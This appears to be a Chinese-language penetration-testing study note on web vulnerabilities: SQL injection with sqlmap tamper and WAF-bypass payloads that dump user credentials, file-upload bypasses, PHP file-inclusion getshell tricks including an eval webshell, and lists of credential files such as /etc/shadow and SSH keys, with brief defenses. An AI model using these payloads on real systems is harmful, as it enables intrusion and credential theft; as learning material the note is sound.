[TOC]



# web中的常见漏洞

## 注入漏洞

- SQL注入
- 命令注入
- 代码注入
- 表达式注入
- XML外部实体注入

## 文件相关

- 本地/远程文件包含
- 任意文件上传
- 任意文件下载/读取

## 信息泄露

- .svn/.git源代码泄露
- 配置文件、测试文件
- 应用接口暴露
- 备份文件泄露
- 代码托管平台源码泄露

## 业务逻辑安全

- 用户弱口令
- 用户名/密码枚举
- 越权漏洞
- 未授权访问
- 验证码缺陷
- 短信轰炸

## 中间件缺陷

- jboss反序列化
- tomcat文件包含
- weblogic反序列化

## 服务器安全

- 永恒之蓝（MS17-010）
- 操作系统弱口令
- 本地权限提升

## 前端漏洞

- 跨站脚本攻击（XSS）
- 跨站点伪造请求（CSRF）

# sql注入漏洞

## sql注入分类

### 注入点分类

- 数字型
  - id=2'	异常
  - id=2-1	比较id=1
  - id=2-0	比较页面变化
- 字符型
  - id=1'	异常
  - id=1' and 'a'='a	逻辑真
  - id=1' and 'a'='b	逻辑假

- 搜索型
  - id=1'	异常
  - id=1%' --`空格`	正常
  - id=1%' and 1=1 and '%'='	逻辑真
  - id=1%' and 1=2 and '%'='	逻辑假

### 提交方式分类

- get注入
- post注入
- http注入
- cookie注入

### 攻击方式分类

- 带外注入
- 二次注入
- 宽字节注入

### 执行方式分类

- 基于布尔型的盲注
- 基于时间的盲注
- 基于报错的注入
- 联合查询注入
- 堆叠查询注入
- 内联查询注入

## sql注入的绕过技巧

### 字符编码

| tamper脚本            | 描述                                     |
| --------------------- | ---------------------------------------- |
| base64encode          | base64编码payload                        |
| chardoubleencode      | 双url编码                                |
| charencode            | url编码                                  |
| charunicodeencode     | 使用Unicode编码                          |
| charunicodeescape     | 使用Unicode编码                          |
| apostrophemask        | 使用utf-8编码字符`'`，`%EF%BC%87`替换`'` |
| htmlencode            | 使用HTML编码payload                      |
| apostrophennullencode | 使用`%00%27`替换`'`                      |
| overlongutf8          | 对非字符数字进行utf-8编码                |
| overlongutf8moremore  | 对所有payload进行utf-8编码               |

### 同等功能替换

| tamper脚本            | 描述                                                         |
| --------------------- | ------------------------------------------------------------ |
| between               | 使用`BETWEEN`实现>和=功能                                    |
| commalesslimit        | `LIMIT N OFFSET M `替换`LIMIT M,N`，绕过逗号过滤             |
| commalessmid          | `MID(A FROM B FOR C)`替换`MID(A,B,C)`，绕过逗号过滤          |
| concat2concatws       | 使用`caoncat_ws`函数替换`concat`函数                         |
| equaltolike           | 使用`LIKE`替换=                                              |
| greatest              | 使用`GREATEST`函数实现>功能，`1 AND A>B`转换为`1 AND GREATEST(A,B+1)=A` |
| least                 | 使用`LEAST`函数实现>功能，`1 AND A>B`转换为`1 AND LEAST(A,B+1)=B+1` |
| ifnul2ifisnull        | 使用`IF(ISNULL(A),B,A)`替换`IFNULL(A,B)`                     |
| ifnull2casewhenisnull | 使用`CASE WHEN SINULL(A) THEN (B) ELSE (A) END`替换`IFNULL(A,B)` |
| symboliclogical       | 使用&&和'                                                    |

### 内嵌注释符符号
| tamper脚本               | 描述                                                         |
| ------------------------ | ------------------------------------------------------------ |
| commentbeforeparentheses | 在括号前添加注释符`/**/`，如`ABS()`变成`ABS/**/()`           |
| space2comment            | 使用注释符`/**/`替换空格，`SELECT ID FROM USERS`转换为`SELECT/**/ID/**/FROM/**/USERS` |
| space2dash               | 使用注释符`--`替换空格                                       |
| space2hash               | 使用注释符`#`替换空格                                        |
| space2morecomment        | `SELECT ID FROM USERS`转换为`SELECT/**_**/ID/**_**/FROM/**_**/USERS` |
| randomcomments           | 随机插入注释符`/**/`，如`INSERT`转换为`INS/**/E/**/RT`       |
| versionedkeywords        | 使用MySQL特有注释符`/*!*/`，保留关键字，在MySQL中`/*!内容*/`表示内容在MySQL中才执行，其他数据库不会执行 |
| versionedmorekeywords    | 使用MySQL特有注释符`/*!*/`，保留更多关键字                   |


### 绕过云锁

> ?id=-1%20union/*!99999aaaa*/select%201,2,3
>
> ?id=-1%20union/*!99999aaaa*/select%201,database/*!99999aaaa*/(),3	database被过滤
>
> ?id=-1%20union/*!99999aaaa*/select%20--1,(select%20group_concat(table_name)from%20information_schema.tables),3	select... from被过滤
>
> ?id=-1%20union/*!99999aaaa*/select%20--1,(select%20group_concat(table_name)from%20information_schema.tables%20where%20table_schema=database()),3	爆表名
>
> ?id=111%20union/*!99999aaaa*/select%20--1,(select%20group_concat(column_name)from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27users%27),3	爆字段
>
> ?id=-1%20union/*!99999aaaa*/select%20--1,(select%20group_concat(concat(username,%27~%27,password))from%20security.users),3	查数据

## SQL注入防御

- sql预编译
- 后端服务对接受的参数进行合法性验证，如匹配特定的参数类型
- 严格过滤SQL语句中的关键字和特殊符号

# 文件上传漏洞

## 利用前提

- 参数可控：文件名，文件内容，[文件路径]
- 上传文件位于服务器可解析脚本的web目录
- 可直接或间接获取上传文件的绝对路径或相对路径

## 文件上传代码

### 文件写入

Java Native

- FileOutputStream
- FileInputStream
- outputStream.write

SpringBoot

uploadFile.transferTo

### 文件解压缩

Java Native

ZipEntry

### 文件移动（重命名）

Java Native

File renameto

### 文件拷贝

Java Native

- FileChannel
- FileUtils.copyFile
- Files.copy

## 文件上传绕过

### 畸形数据包

- 畸形的请求头字段
- chunked
- 脏数据

### 小众文件后缀

| asp/aspx | .cer   | .cdx  | .asa  | .asax | .ascx | .ashx  | .asmx |
| -------- | ------ | ----- | ----- | ----- | ----- | ------ | ----- |
| php      | .phtml | .php4 | .phpt | .php5 | .php7 | .phps  | .php3 |
| jsp      | .jsw   | .jsv  | .jspx | .jspa | .jspf | .jhtml |       |

### NTFS ADS

- test.php:p.jpg	空文件
- test.php::$INDEX_ALLOCATION	文件夹
- test.php::$DATA	文件

### 00截断

在java中JKD1.7.0_40前的版本中若使用FileOutputStream实现文件上传功能的内容保存，可能导致00截断，绕过黑名单、文件上传白名单检测。之后的版本会对文件路径检查，若文件路径有非法字符，则抛出异常Invalid file path

## 文件上传防御

- 使用白名单策略检查文件扩展名
- 上传文件的目录禁止http请求直接访问。如果需要访问，要上传到和web服务器不同的域名下，并设置该目录不解析脚本
- 上传文件的文件名和目录名由系统根据时间生成，禁止用户自定义

# 文件包含漏洞

## 代码&利用方法

```php
<?php
	$filename=$_GET['page'];
	include($filename);#如果包含出错，只会警告，不影响后续语句执行
//文件包含函数
    #require()#如果包含出错，提出致命错误，不执行后门语句
    #require_once()
    #include_once()
//文件操作函数
    #file()
    #fopen()
    #readfile()
//文件内容操作函数
    #file_get_contents()
    #file_put_contents()
?>
```

- 通过`GET /<?php @eval($_REQUEST['cmd']);?> HTTP/1.1`请求服务器后，会在服务器日志中留下记录，如果服务器日志为默认路径可以通过`?page=/var/log/error.log`来getshell
- 将一句话木马打包成zip格式后，重命名为phpinfo.jpg，上传到服务器images目录后，通过`file=phar://./images/phpinfo.jpg/getshell.php`来getshell

```php
#远程文件包含需要php.ini中设置如下
allow_url_fopen=On
allow_url_include=On
```

## php伪协议

- `file://`访问操作系统本地文件的文件系统`file:///etc/passwd、file://C:\Windows\system.ini`
- `http://`访问http(s)协议的url`?page=http://file.local.com/LFI/phpinfo.txt`
- `ftp://`访问ftp(s)协议的url`?page=ftp://user:pass@ftp.local.com/phpinfo.txt`
- `php://`访问各个I/O流`php://filer php://input`
- `zlib://、zip://`压缩流协议`zip://压缩包绝对路径#压缩文件内的子文件名`
- `data://`数据流协议`data://text/plain;base64,YWJjZA==`
- `glob://`php自带的文件目录管理协议，查找匹配的文件路径模式
- `phar://`php归档（解压）协议`phar://压缩包/压缩文件内的子文件名`

## 例子

```php
<?php
$filename=$_REQUEST['file'];
$file_contents=file_get_contents($filename);
echo $file_contents;
?>
```

- 用`file=php://filter/read=/resource=../config.php`来读取文件
- 用`file=php://filter/read=convert.base64-encode/resource=../config.php`来读取base64编码后的文件

```php
<?php
$filename=$_REQUEST['file'];
$txt=$_GET['txt'];
file_put_contents($filename,$txt);
?>
```

- 用`file=php://filter/write=convert.base64-encode/resource=../info.php&txt=PD9waHAgQGV2YWwoJF9SRVFVRVNUWydjbWQnXSk7Pz4=`来将`<?php @eval($_REQUEST['cmd']);?>`base64编码后的内容写入info.php

## 文件包含防御

- 保证参数用户不可控、不可构造
- 对参数判断，过滤`'.','..','/','\'`字符，同时使用basename()函数处理参数
- 避免使用动态包含，在需要包含的页面中对所有变量初始化

# 任意文件下载或读取漏洞

## 攻击利用点

### windows

- C:\Windows\sytem32\winevt\Logs
- C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
- C:\Windows\sytem32\inetstr\config\applicationHost.config
- C:\WINNT\system32\inetsrv\MetaBase.bin
- C:\Users\Administrator\AppData\Local\Everything\Everything.db

### Linux

- /etc/passwd
- /etc/shadow
- /proc/version
- /etc/issue
- /root/.ssh/id_rsa
- /root/.ssh/known_hosts
- /var/log/secure
- /var/lib/mlocate/mlocate.db
- /etc/rc.local
- /proc/self/environ
- /root/.viminfo
- /root/.bash_history
- /proc/net/arp

### 数据库

- /home/mysql/.mysql_history
- /etc/mysql/conf.d/mysql.cnf
- /etc/redis/redis.conf
- /var/redis/log
- /var/lib/pgsql/9.6/data/postgresql.conf
- /var/lib/pgsql/9.6/data

### 其他

- config.php
- web.config
- web.xml
- jdbc.properties
- webroot.war
- webroot.zip

## 防御策略

- 对参数过滤，过滤`'.','..','/',''`字符
- 限定文件访问范围，如php.ini配置open_basedir为指定目录
- 对于下载文件的目录做好限制，只能下载指定目录下的文件，或者将要下载的文件存入数据库，附件下载时指定数据库中的id即可

